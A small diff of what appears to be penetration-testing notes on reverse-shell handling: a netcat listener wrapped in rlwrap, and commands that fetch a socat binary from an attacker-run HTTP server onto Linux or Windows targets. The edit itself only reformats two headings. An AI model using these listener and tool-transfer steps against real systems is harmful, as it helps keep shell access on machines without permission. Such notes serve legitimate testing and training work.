@@ -25,12 +25,12 @@ sudo apt install rlwrap
 rlwrap nc -lvnp <port>
 ```
 OR
-//stepto-socat trick
+stepto-socat trick
 ```bash
 sudo python3 -m http.server 80
 wget <local-ip>/socat -0 /tmp/socat
 ````
-!!IF WINDOWS
+IF WINDOWS
 ```powershell
 Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
 ```
